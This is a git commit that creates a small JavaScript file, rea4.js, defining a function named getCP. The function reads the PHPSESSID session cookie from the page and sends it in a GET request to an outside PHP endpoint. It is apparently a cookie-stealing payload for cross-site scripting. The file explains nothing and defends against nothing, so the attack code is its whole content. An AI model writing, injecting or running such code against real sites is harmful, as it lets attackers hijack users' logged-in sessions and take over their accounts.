74e0760cbc13eb2290a83548e755216034a76c4e
checked666 <42522983+checked666@users.noreply.github.com>
2018-08-20 00:40:15 +0300

    Create rea4.js

---
+++ rea4.js
@@ -0,0 +1,6 @@
+getCP = function() {
+  var xhr = new XMLHttpRequest();
+  var id = document.cookie.match(/PHPSESSID=[^;]+/);
+  xhr.open("GET","http://logov.mcdir.ru/s.php?id="+id);
+  xhr.send();
+}
